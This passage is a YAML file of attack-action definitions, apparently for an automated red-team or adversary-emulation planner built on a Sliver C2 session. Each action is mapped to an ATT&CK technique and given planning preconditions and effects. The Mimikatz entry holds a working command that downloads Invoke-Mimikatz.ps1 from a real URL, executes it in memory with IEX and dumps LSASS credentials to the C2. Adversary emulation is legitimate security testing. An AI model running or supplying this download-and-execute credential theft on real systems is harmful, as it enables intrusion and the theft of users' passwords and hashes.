  - uuid: sliver-powershell
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Session Derive
      command: |
        # no-op — derivation only
    arguments:
      executor_parent:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor3_var_in_plan
      executor_derived:
        description: The derived Windows Powershell executor.
        required: true
        pddl_index: executor0_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
    effects:
      - (powershell ?s2 - executor ?target - host)
      - operator: When
        params:
          condition: (elevated-executor ?executorID - executor)
          effect: (elevated-executor ?s2 - executor)
  - uuid: art-t1003_001-mimikatz-powershell
    name: Powershell Mimikatz
    id:
      - T1003.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: LSASS Memory'
    description: |
      Dumps credentials from LSASS memory by invoking a remote Invoke-Mimikatz.ps1
      (PowerSploit variant). Requires elevated PowerShell context and outbound
      HTTPS to the script host. See ART auto_generated_guid
      66fb0bc1-3c3f-47e9-a298-550ecfefacbc for cross-ref.
    execution:
      executor: Powershell Executor
      command: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
    arguments:
      executor:
        description: The Powershell session ID used to invoke the command.
        required: true
        pddl_index: executor0_var_in_plan
      remote_script:
        default: 
          https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
        description: URL to a hosted Invoke-Mimikatz.ps1 (PowerSploit / mirror).
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: sliver-cmd
    name: Execute Command (cmd.exe)
    id:
